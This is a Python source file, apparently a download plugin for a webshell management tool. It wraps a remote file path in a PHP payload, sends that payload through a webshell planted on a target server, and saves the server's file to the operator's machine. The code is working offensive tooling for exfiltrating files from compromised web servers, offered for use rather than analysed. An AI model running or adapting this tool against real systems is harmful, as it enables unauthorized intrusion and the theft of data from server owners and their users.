from os import makedirs, path

from libs.config import alias, color, gget
from libs.myapp import base64_encode, send
from libs.functions.webshell_plugins.download import get_php_download


def get_php(web_file_path: str):
    return get_php_download() % base64_encode(web_file_path)


@alias(True, func_alias="d", _type="FILE", w="web_file_path", l="local_path")
def run(
    web_file_path: str, local_path: str = "",
) -> bool:
    """
    download

    Download file from target system.

    eg: download {web_file_path} {local_path=doughnuts/target/site.com/...}
    """
    php = get_php(web_file_path)
    res = send(php)
    if (not res):
        return
    content = res.r_content
    download_path = local_path or gget("webshell.download_path", "webshell")
    if not path.isdir(download_path):
        makedirs(download_path)
    if len(content):
        file_name = path.split(web_file_path)[1]
        file_path = path.join(download_path, file_name) if path.isdir(
            download_path) else download_path
        with open(file_path, "wb") as f:
            f.write(content)
        print(color.green(f"Downloaded file has been saved to {file_path}"))
        return file_path
    else:
        print(color.red("File not exist / Download error"))
        return ''
